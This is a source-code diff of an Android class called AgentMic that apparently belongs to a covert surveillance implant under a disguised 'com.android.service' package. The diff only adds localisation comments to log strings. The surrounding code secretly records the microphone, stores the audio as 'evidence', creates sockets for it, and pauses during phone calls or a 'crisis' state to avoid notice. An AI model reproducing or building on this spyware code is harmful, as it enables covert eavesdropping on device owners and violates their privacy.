@@ -42,7 +42,7 @@ import com.android.service.util.Utils;
  */
 public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListener, OnInfoListener {
 
-	private static final String TAG = "AgentMic";
+	private static final String TAG = "AgentMic"; //$NON-NLS-1$
 	private static final long MIC_PERIOD = 5000;
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 
@@ -73,7 +73,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 		try {
 
 			if (Cfg.DEBUG) {
-				Check.requires(status == StateRun.STARTING, "inconsistent status");
+				Check.requires(status == StateRun.STARTING, "inconsistent status"); //$NON-NLS-1$
 			}
 
 			addPhoneListener();
@@ -82,22 +82,22 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 
 			startRecorder();
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "started");
+				Check.log(TAG + "started") ;//$NON-NLS-1$
 			}
 
 		} catch (final IllegalStateException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (begin) Error: " + e.toString());
+				Check.log(TAG + " (begin) Error: " + e.toString()) ;//$NON-NLS-1$
 			}
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (begin) Error: " + e.toString());
+				Check.log(TAG + " (begin) Error: " + e.toString()) ;//$NON-NLS-1$
 			}
 		}
 	}
@@ -110,10 +110,10 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	@Override
 	public void end() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (end)");
+			Check.log(TAG + " (end)") ;//$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(status == StateRun.STOPPING, "state not STOPPING");
+			Check.requires(status == StateRun.STOPPING, "state not STOPPING"); //$NON-NLS-1$
 		}
 
 		removePhoneListener();
@@ -122,7 +122,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 		stopRecorder();
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (ended)");
+			Check.log(TAG + " (ended)") ;//$NON-NLS-1$
 		}
 
 	}
@@ -135,13 +135,13 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	@Override
 	public void go() {
 		if (Cfg.DEBUG) {
-			Check.requires(status == StateRun.STARTED, "inconsistent status");
+			Check.requires(status == StateRun.STARTED, "inconsistent status"); //$NON-NLS-1$
 		}
 
 		final int amp = recorder.getMaxAmplitude();
 		if (amp != 0) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): max amplitude=" + amp);
+				Check.log(TAG + " (go): max amplitude=" + amp) ;//$NON-NLS-1$
 			}
 		}
 
@@ -150,14 +150,14 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "numFailures: " + numFailures);
+				Check.log(TAG + "numFailures: " + numFailures) ;//$NON-NLS-1$
 			}
 			stopThread();
 		}
 
 		if (Status.self().crisisMic()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "crisis!");
+				Check.log(TAG + "crisis!") ;//$NON-NLS-1$
 			}
 			suspend();
 		}
@@ -181,7 +181,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	private void saveRecorderEvidence() {
 
 		if (Cfg.DEBUG) {
-			Check.requires(recorder != null, "saveRecorderEvidence recorder==null");
+			Check.requires(recorder != null, "saveRecorderEvidence recorder==null"); //$NON-NLS-1$
 		}
 
 		final byte[] chunk = getAvailable();
@@ -204,7 +204,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "zero chunk ");
+				Check.log(TAG + "zero chunk ") ;//$NON-NLS-1$
 			}
 			numFailures += 1;
 		}
@@ -224,10 +224,10 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			}
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getAvailable) Error: " + e);
+				Check.log(TAG + " (getAvailable) Error: " + e) ;//$NON-NLS-1$
 			}
 		}
 
@@ -261,17 +261,17 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			startRecorder();
 		} catch (final IllegalStateException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (restartRecorder) Error: " + e);
+				Check.log(TAG + " (restartRecorder) Error: " + e) ;//$NON-NLS-1$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (restartRecorder) Error: " + e);
+				Check.log(TAG + " (restartRecorder) Error: " + e) ;//$NON-NLS-1$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 		}
 	}
@@ -286,7 +286,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	 */
 	private synchronized void startRecorder() throws IllegalStateException, IOException {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (startRecorder)");
+			Check.log(TAG + " (startRecorder)") ;//$NON-NLS-1$
 		}
 		numFailures = 0;
 
@@ -321,7 +321,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			sender.setSendBufferSize(500000);
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (createSockets) Error: " + e);
+				Check.log(TAG + " (createSockets) Error: " + e) ;//$NON-NLS-1$
 			}
 		}
 	}
@@ -335,10 +335,10 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			lss.close();
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (deleteSockets) Error: " + e);
+				Check.log(TAG + " (deleteSockets) Error: " + e) ;//$NON-NLS-1$
 			}
 		}
 	}
@@ -349,11 +349,11 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	 */
 	private synchronized void stopRecorder() {
 		if (Cfg.DEBUG) {
-			Check.requires(recorder == null, "null recorder");
+			Check.requires(recorder == null, "null recorder"); //$NON-NLS-1$
 		}
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (stopRecorder)");
+			Check.log(TAG + " (stopRecorder)") ;//$NON-NLS-1$
 		}
 
 		recorder.setOnErrorListener(null);
@@ -386,7 +386,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 		databuffer.writeLong(fId);
 
 		if (Cfg.DEBUG) {
-			Check.ensures(additionalData.length == tlen, "Wrong additional data name");
+			Check.ensures(additionalData.length == tlen, "Wrong additional data name"); //$NON-NLS-1$
 		}
 
 		return additionalData;
@@ -395,12 +395,12 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	public int notification(Call call) {
 		if (call.isOngoing()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): call incoming, suspend");
+				Check.log(TAG + " (notification): call incoming, suspend") ;//$NON-NLS-1$
 			}
 			suspend();
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): ");
+				Check.log(TAG + " (notification): ") ;//$NON-NLS-1$
 			}
 			resume();
 		}
@@ -415,7 +415,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			saveRecorderEvidence();
 			stopRecorder();
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (suspended)");
+				Check.log(TAG + " (suspended)") ;//$NON-NLS-1$
 			}
 		}
 	}
@@ -427,17 +427,17 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 				startRecorder();
 			} catch (final IllegalStateException e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (resume) Error: " + e);
+					Check.log(TAG + " (resume) Error: " + e) ;//$NON-NLS-1$
 				}
 			} catch (final IOException e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (resume) Error: " + e);
+					Check.log(TAG + " (resume) Error: " + e) ;//$NON-NLS-1$
 				}
 			}
 
 			super.resume();
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (resumed)");
+				Check.log(TAG + " (resumed)") ;//$NON-NLS-1$
 			}
 		}
 
@@ -445,13 +445,13 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 
 	public void onInfo(MediaRecorder mr, int what, int extra) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (onInfo): " + what);
+			Check.log(TAG + " (onInfo): " + what) ;//$NON-NLS-1$
 		}
 	}
 
 	public void onError(MediaRecorder mr, int what, int extra) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (onError) Error: " + what);
+			Check.log(TAG + " (onError) Error: " + what) ;//$NON-NLS-1$
 		}
 	}
 }
